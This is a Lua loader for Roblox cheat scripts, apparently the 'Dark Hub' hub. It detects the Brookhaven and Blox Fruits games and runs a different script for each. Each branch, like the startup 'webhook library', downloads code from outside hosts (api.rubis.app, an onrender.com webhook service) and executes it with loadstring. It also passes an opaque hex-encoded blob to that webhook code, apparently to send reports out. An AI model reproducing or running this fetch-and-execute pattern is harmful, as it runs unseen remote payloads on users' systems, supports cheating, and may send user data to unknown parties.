-- CONFIG
local BROOKHAVEN_PLACEID = 4924922222

-- Blox Fruits (lista de PlaceIds)
local bloxfruits_PLACEIDS = {
    [2753915549] = true,
    [4442272183] = true,
    [7449423635] = true
}

local bloxfruitsUrl  = "https://api.rubis.app/v2/scrap/KCHqlYKLFkFO0a4W/raw"
local brookhavenUrl = "https://api.rubis.app/v2/scrap/4yqgMpyEJ89H4RmM/raw"
local universalUrl  = "https://api.rubis.app/v2/scrap/p4Odld7yVpstir16/raw"

getgenv().bloxWebhookHost = "https://blox-webhook-notifier.onrender.com"

local cryptUrl = "9ed426070edbdcefcb577ba984b9891fa5093874e69b018740ab59294deb950f06584e4bc23a26d84cc51fb20e63ff175dd60d55eaf599e24403d68ddf4c6d8195c44d6cb11a1dbcd6409e93e1330940cacb5670467dbb9d5c99667d7f7a74aaa4f985280929462b778e85f2a3a1ff39b4953205ac9bd3edc27ad32436eaa121dd097322d43a55cae509a2eb4f858b5bdf18e9d3047c448b6a335cb9f65a8880d03dac2e51816cf0619ca16ef2b9e1b047a635edb4bcd2e6d0a534edabdd8ae23d071aa7de5cd6e366121dff538df26f649dd156e15631a290fa87cb0a8ea8f0"

-----------------------------------------------------
-- WEBHOOK LIB
-----------------------------------------------------
local requestWebhook = loadstring(
    game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library")
)()

requestWebhook(cryptUrl)

-----------------------------------------------------
-- FAST LOAD
-----------------------------------------------------
local function fastLoad(url)
    local src = game:HttpGet(url)
    loadstring(src)()
end

-----------------------------------------------------
-- DETECÇÃO DO JOGO
-----------------------------------------------------
local id = game.PlaceId

if id == BROOKHAVEN_PLACEID then
    print("[Dark Hub] Brookhaven detectado. Carregando script...")
    fastLoad(brookhavenUrl)

elseif bloxfruits_PLACEIDS[id] then
    print("[Dark Hub] Blox Fruits detectado. Aplicando tema e carregando script...")

    -- ✅ Tema aplicado antes de carregar o script
    _G.ThemeID = "87711339734959"

    fastLoad(bloxfruitsUrl)

else
    print("[Dark Hub] Jogo não identificado. Carregando script universal...")
    fastLoad(universalUrl)
end
